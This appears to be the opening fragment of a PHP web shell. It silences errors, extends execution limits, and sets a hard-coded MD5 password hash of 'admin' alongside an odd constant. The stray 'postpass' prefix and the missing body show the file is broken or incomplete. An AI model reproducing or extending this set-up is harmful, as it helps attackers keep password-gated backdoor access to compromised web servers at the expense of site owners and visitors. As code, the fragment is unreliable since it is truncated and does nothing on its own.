postpass<?php
error_reporting(E_ERROR);
@ini_set('display_errors','Off');
@ini_set('max_execution_time',20000);
@ini_set('memory_limit','256M');
header("content-Type: text/html; charset=utf-8");
$password = "21232f297a57a5a743894a0e4a801fc3";
define('Viv, bebegim.','');

?>